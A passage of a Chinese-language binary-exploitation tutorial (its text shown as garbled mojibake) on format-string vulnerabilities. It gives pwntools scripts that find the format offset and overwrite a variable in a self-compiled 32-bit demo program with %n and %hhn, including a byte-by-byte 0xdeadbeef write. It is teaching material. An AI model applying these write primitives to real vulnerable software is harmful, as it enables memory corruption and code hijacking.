</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¼–è¯‘32ä½ï¼š  <a class="link" href="test" >test</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc demox.c -o <span class="nb">test</span> -m32 -no-pie
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨IDAçœ‹åˆ°è¿™ä¸ªç¨‹åºæ˜¯æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ï¼Œé¦–å…ˆå°±æ˜¯éœ€è¦ç¡®å®šå¥½æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ï¼Œæ–¹æ³•æœ‰å‡ ç§ï¼Œä¹‹å‰è®²è¿‡ï¼Œè¿™é‡Œéƒ½å¤ç°ä¸€ä¸‹ã€‚</p>
<p>ç¬¬ä¸€ç§ï¼š</p>
<p><img src="/p/pwn-3/15.png"
	width="1698"
	height="95"
	srcset="/p/pwn-3/15_hu_165fd3376c1ec2ad.png 480w, /p/pwn-3/15_hu_427263b216e3bf03.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1787"
		data-flex-basis="4289px"
	
></p>
<p>å¯ä»¥å¾—çŸ¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»æ˜¯7</p>
<p>ç¬¬äºŒç§ï¼š</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œåå°±æ˜¯è¿™æ ·å¦‚ä¸‹æƒ…å†µï¼š</p>
<p><img src="/p/pwn-3/16.png"
	width="1918"
	height="878"
	srcset="/p/pwn-3/16_hu_5cde66cf95aff15c.png 480w, /p/pwn-3/16_hu_124b067b1c7e8092.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>å¾—åˆ°åç§»åï¼Œè¿›è¡Œä¸‹ä¸€æ­¥ï¼Œå…ˆæ”¹expï¼š</p>
<p><img src="/p/pwn-3/17.png"
	width="1020"
	height="90"
	srcset="/p/pwn-3/17_hu_fc9307ce88163d13.png 480w, /p/pwn-3/17_hu_5697558cc2a74d3d.png 1024w"
	loading="lazy"
	
		alt="å˜é‡açš„åœ°å€:0x804C020"
	
	
		class="gallery-image" 
		data-flex-grow="1133"
		data-flex-basis="2720px"
	
></p>
<p>python2ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;%</span><span class="si">{}</span><span class="s2">c%7$n&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ï¼ˆå»ºè®®ç”¨ï¼‰python3ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="s2">&#34;%</span><span class="si">{}</span><span class="s2">c%7$n&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mh">0x30</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># æˆ–è€…ç›´æ¥å†™æ­»æ•°å€¼ï¼špayload = p32(a_address) + b&#34;%44c%7$n&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>python2ä¸ºä¾‹å­ï¼Œè¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="/p/pwn-3/18.png"
	width="1918"
	height="878"
	srcset="/p/pwn-3/18_hu_5174979d7c44ef50.png 480w, /p/pwn-3/18_hu_7549fcfecf9d544a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>ç„¶åå°±è¿è¡Œtelescopeå‘½ä»¤ï¼Œé™„å¸¦espå¯„å­˜å™¨çš„åœ°å€ï¼Œå·¦è¾¹çš„æ˜¯è¾“å‡ºç»“æœäº†ï¼Œæ³¨æ„espåœ°å€æ˜¯çº¢è‰²æ¡†çš„é‚£ä¸ªï¼Œåˆ«çœ‹é”™å’¯ã€‚</p>
<p>æ¥æˆ‘ä»¬å†ç”¨fmtargéªŒè¯çœ‹çœ‹ï¼ˆå…¶å®å¾€ä¸‹çœ‹å°±èƒ½çœ‹åˆ°åç§»äº†ï¼Œç”¨fmtargæŸ¥çœ‹å°±æ˜¯æ›´å‡†ç¡®è€Œå·²ï¼Œç”¨æ‰‹æŒ‡æ•°çš„è¿‡æ¥ä¹Ÿè¡Œï¼‰ï¼š</p>
<p><img src="/p/pwn-3/19.png"
	width="1835"
	height="430"
	srcset="/p/pwn-3/19_hu_772ce0962d321394.png 480w, /p/pwn-3/19_hu_63fd4631850be71.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="426"
		data-flex-basis="1024px"
	
></p>
<p>The index of format argument : <code>7 (&quot;\%6$p&quot;)</code></p>
<p>ç»§ç»­&hellip;</p>
<p><img src="/p/pwn-3/20.png"
	width="1918"
	height="438"
	srcset="/p/pwn-3/20_hu_3690c27c4ef57c71.png 480w, /p/pwn-3/20_hu_bc7825d912793d0d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="437"
		data-flex-basis="1050px"
	
></p>
<p>ç´«è‰²è¿™éƒ¨åˆ†æ˜¯açš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°0x30äº†ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´è¿è¡Œäº†è¿™expï¼Œæˆ‘ä»¬æˆåŠŸå®ç°äº†<strong>ä»»æ„åœ°å€è¦†ç›–</strong>ï¼Œæˆ‘ç°åœ¨åœæ­¢è°ƒè¯•é€€å‡ºç•Œé¢ï¼Œå»çœ‹æŸ¥çœ‹debugè®°å½•å°±å‘ç°ç»™æˆ‘è¾“å‡ºäº†0x30ï¼š</p>
<p><img src="/p/pwn-3/21.png"
	width="1918"
	height="878"
	srcset="/p/pwn-3/21_hu_a04afd81e96c0870.png 480w, /p/pwn-3/21_hu_ac543c29b95d963d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>ä¹Ÿå°±æ˜¯è¯´aå·²ç»è¦†ç›–æˆ0x30äº†ï¼Œä¿ƒä½¿æ¡ä»¶ifè¾¾æˆï¼Œè§¦å‘<code>printf(&quot;0x30\n&quot;);</code></p>
<p>hhh&hellip;æ€ä¹ˆæ ·æ˜¯ä¸æ˜¯å¾ˆæ¸…æ™°çš„é€»è¾‘ï¼Ÿè¿˜æ˜¯è¯´éš¾çˆ†äº†ï¼ï¼æ²¡äº‹æ…¢æ…¢æ¥ã€‚</p>
<h3 id="è¦†ç›–å°æ•°å­—">è¦†ç›–å°æ•°å­—
</h3><p>æ¥è€ƒè™‘ä¸‹å¦‚ä½•ä¿®æ”¹.dataæ®µçš„å˜é‡ä¸ºä¸€ä¸ªè¾ƒå°çš„æ•°å­—ï¼Œæ¯”å¦‚è¯´ï¼Œå°äº<code>æœºå™¨å­—é•¿</code>çš„æ•°å­—ï¼ˆä»¥2ä¸ºä¾‹ï¼‰ã€‚å¯èƒ½ä¼šè§‰å¾—è¿™å…¶å®æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå¯ä»”ç»†ä¸€æƒ³ï¼ŒçœŸçš„æ²¡æœ‰ä¹ˆï¼Ÿå¦‚æœæˆ‘ä»¬è¿˜æ˜¯å°†è¦è¦†ç›–çš„åœ°
å€æ”¾åœ¨æœ€å‰é¢ï¼Œé‚£ä¹ˆå°†ç›´æ¥å ç”¨æœºå™¨å­—é•¿ä¸ªï¼ˆ4æˆ–8ï¼‰å­—èŠ‚ã€‚æ˜¾ç„¶ï¼Œæ— è®ºä¹‹åå¦‚ä½•è¾“å‡ºï¼Œéƒ½åªä¼šæ¯”4å¤§ã€‚</p>
<p>ä¸€èˆ¬æœ‰ä¸¤ç§åˆ©ç”¨æ–¹æ³•ï¼š</p>
<ol>
<li>åˆ©ç”¨æ•´å‹æº¢å‡º</li>
<li>å°†åç§»ç½®å</li>
</ol>
<p>æˆ‘ä»¬å½“æ—¶åªæ˜¯ä¸ºäº†å¯»æ‰¾åç§»ï¼Œæ‰€ä»¥æ‰æŠŠ tag æ”¾åœ¨å­—ç¬¦ä¸²çš„æœ€å‰é¢ï¼Œå¦‚æœæˆ‘ä»¬æŠŠtagæ”¾åœ¨ä¸­é—´ï¼Œå…¶å®ä¹Ÿæ˜¯æ— å¦¨çš„ã€‚ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬æŠŠåœ°å€æ”¾åœ¨ä¸­é—´ï¼Œåªè¦èƒ½å¤Ÿæ‰¾åˆ°å¯¹åº”çš„åç§»ï¼Œå…¶ç…§æ ·ä¹Ÿå¯ä»¥å¾—åˆ°å¯¹åº”çš„æ•°å€¼ã€‚æ¯”å¦‚<code>aa%k$naddr</code></p>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;aa%9$nbb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/pwn-3/22.png"
	width="1918"
	height="878"
	srcset="/p/pwn-3/22_hu_14c5e05df500549.png 480w, /p/pwn-3/22_hu_af193aa0287aa3c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>ç”¨telescopeå‘½ä»¤æŸ¥çœ‹ç‰¹å®šåœ°å€ï¼Œç„¶åç”¨niä½¿payloadæ³¨å…¥ï¼Œä¸‹ä¸€æ­¥å†ç”¨telescopeå‘½ä»¤æŸ¥çœ‹aå˜é‡çš„å˜åŒ–ï¼Œå¯ä»¥çœ‹åˆ°aå˜æˆ2äº†ã€‚</p>
<p><img src="/p/pwn-3/23.png"
	width="1164"
	height="349"
	srcset="/p/pwn-3/23_hu_8d55ee4f4ffe0bfb.png 480w, /p/pwn-3/23_hu_51d5f8aaea6fc7a0.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="333"
		data-flex-basis="800px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¾“å‡ºäº†2ï¼ŒæˆåŠŸå®ç°è¦†ç›–äº†ã€‚</p>
<h3 id="è¦†ç›–å¤§æ•°å­—">è¦†ç›–å¤§æ•°å­—
</h3><p>ä¸Šé¢ä»‹ç»äº†è¦†ç›–å°æ•°å­—ï¼Œè¿™é‡Œæˆ‘ä»¬å°±æ¥ä»‹ç»è¦†ç›–å¤§æ•°å­—äº†ã€‚ä¸Šé¢ä¹Ÿè¯´äº†ï¼Œå¯ä»¥é€‰æ‹©ç›´æ¥ä¸€æ¬¡æ€§è¾“å‡ºå¤§æ•°å­—ä¸ªå­—èŠ‚æ¥è¿›è¡Œè¦†ç›–ï¼Œä½†æ˜¯è¿™æ ·åŸºæœ¬ä¹Ÿä¸ä¼šæˆåŠŸï¼Œå› ä¸ºå¤ªé•¿äº†ã€‚å› æ­¤æˆ‘ä»¬ä¸€èˆ¬é€‰ç”¨å¦ä¸€ç§æ–¹æ³•æ¥è¦†ç›–å¤§æ•°å­—ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬è¦å…ˆäº†è§£å˜é‡åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ ¼å¼ï¼š
åœ¨Ã—86å’ŒÃ—64çš„ä½“ç³»ç»“æ„ä¸­ï¼Œå˜é‡çš„å­˜å‚¨æ ¼å¼ä¸ºä»¥<strong>å°ç«¯å­˜å‚¨</strong>ï¼Œå³æœ€ä½æœ‰æ•ˆä½å­˜å‚¨åœ¨ä½åœ°å€ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œ0x12345678 åœ¨å†…å­˜ä¸­ç”±ä½åœ°å€åˆ°é«˜åœ°å€ä¾æ¬¡ä¸º\Ã—78\x56\x34\Ã—12ã€‚</p>
<ul>
<li>
<p>hhå¯¹äºæ•´æ•°ç±»å‹ï¼ŒprintfæœŸå¾…ä¸€ä¸ªä»charæå‡çš„intå°ºå¯¸çš„æ•´å‹å‚æ•°ã€‚</p>
</li>
<li>
<p>hå¯¹äºæ•´æ•°ç±»å‹ï¼ŒprintfæœŸå¾…ä¸€ä¸ªä»shortæå‡çš„intå°ºå¯¸çš„æ•´å‹å‚æ•°ã€‚</p>
</li>
</ul>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>%hhn</code>ä¸<code>%hn</code>å‘å•(åŒ)å­—èŠ‚å†™å…¥æ•°æ®ã€‚</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>0x8</th>
          <th>0x28</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0x10</td>
          <td>0xFFFF1234</td>
      </tr>
      <tr>
          <td>0x18</td>
          <td>0xFFFF1234</td>
      </tr>
      <tr>
          <td>0x20</td>
          <td>0xFFFF1234</td>
      </tr>
      <tr>
          <td>0x28</td>
          <td>p32(0x80102048+6)</td>
      </tr>
      <tr>
          <td>0x30</td>
          <td>p32(0x80102048+4)</td>
      </tr>
      <tr>
          <td>0x38</td>
          <td>p32(0x80102048+2)</td>
      </tr>
      <tr>
          <td>0x40</td>
          <td>p32(0x80102048)</td>
      </tr>
      <tr>
          <td>0x48</td>
          <td>%xxxc%3$hhn</td>
      </tr>
  </tbody>
</table></div>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>0x80102048</th>
          <th>0xXXXXXXX</th>
      </tr>
  </thead>
  <tbody>
  </tbody>
</table></div>
<p>exp1ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
</span></span><span class="line"><span class="cl"><span class="c1">#0xdeadbeef</span>
</span></span><span class="line"><span class="cl"><span class="c1">#de -&gt; 3</span>
</span></span><span class="line"><span class="cl"><span class="c1">#ad -&gt; 2</span>
</span></span><span class="line"><span class="cl"><span class="c1">#be -&gt; 1</span>
</span></span><span class="line"><span class="cl"><span class="c1">#ef -&gt; 0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="p">(</span><span class="s2">&#34;</span><span class="si">%x</span><span class="s2">xc%7$hhn&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>payload+= (&quot;%xxc%7$hhn&quot;).encode()</code>çš„xxæ˜¯å¤šå°‘ï¼Ÿ</p>
<p>è¾“å‡ºçš„æ€»å­—ç¬¦æ•°åŒ…å«ä¸¤éƒ¨åˆ†ï¼š</p>
<ol>
<li>å‰ 4 ä¸ªåœ°å€çš„é•¿åº¦ï¼šæ¯ä¸ªåœ°å€æ˜¯ 4 å­—èŠ‚ï¼ˆ32 ä½ï¼‰ï¼Œå…± <code>4Ã—4 = 16</code> å­—èŠ‚ã€‚</li>
<li><code>%xxc</code> è¾“å‡ºçš„å­—ç¬¦æ•°ï¼š<code>xx</code> ä¸ªå­—ç¬¦ï¼ˆ<code>%xxc</code> ä¼šæ‰“å° <code>xx</code> ä¸ª <code>'c'</code> å­—ç¬¦ï¼‰ã€‚</li>
</ol>
<p>å› æ­¤ï¼Œæ€»å­—ç¬¦æ•° = 16ï¼ˆåœ°å€éƒ¨åˆ†ï¼‰ + xxï¼ˆ<code>%xxc</code> è¾“å‡ºçš„ &lsquo;c&rsquo;ï¼‰ = ç›®æ ‡å€¼ï¼ˆ190ï¼‰ã€‚</p>
<p>0xadæ˜¯173ï¼Œé‚£ä¹ˆ0xad-16=157ï¼›0xbe-0xad=17;0xde-0xbe=32;0xef-0xde=17</p>
<p>exp2ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="p">(</span><span class="s2">&#34;</span><span class="si">%157c</span><span class="s2">%7$hhn</span><span class="si">%17c</span><span class="s2">%8$hhn</span><span class="si">%32c</span><span class="s2">%9$hhn</span><span class="si">%17c</span><span class="s2">%10$hhn&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œç•Œé¢å¦‚ä¸‹ï¼š</p>
<p><img src="/p/pwn-3/24.png"
	width="1918"
	height="878"
	srcset="/p/pwn-3/24_hu_4a4975f1c8b437ab.png 480w, /p/pwn-3/24_hu_62021b927392440f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>è¿™ä¸€ä¸ªç®—æ˜¯æ¯”è¾ƒå¤æ‚çš„æ¼”ç¤ºæ¡ˆä¾‹äº†ï¼Œå¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œæˆ‘çš„æ­¥éª¤å¾ˆè¯¦ç»†äº†ï¼Œå¦‚æœè¿˜æœ‰ç–‘é—®å¯ä»¥è¯„è®ºåŒºè®¨è®ºï¼Œä½œè€…çœ‹åˆ°ä¼šå›ç­”çš„ğŸ˜„ã€‚</p>
<p>å½“ç„¶è¿™ä¸ªpayloadæœ‰ç‚¹ä¹±äº†å•Šï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæ•´ç†å¥½é¡ºåºçš„ï¼ˆè¿è¡Œç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
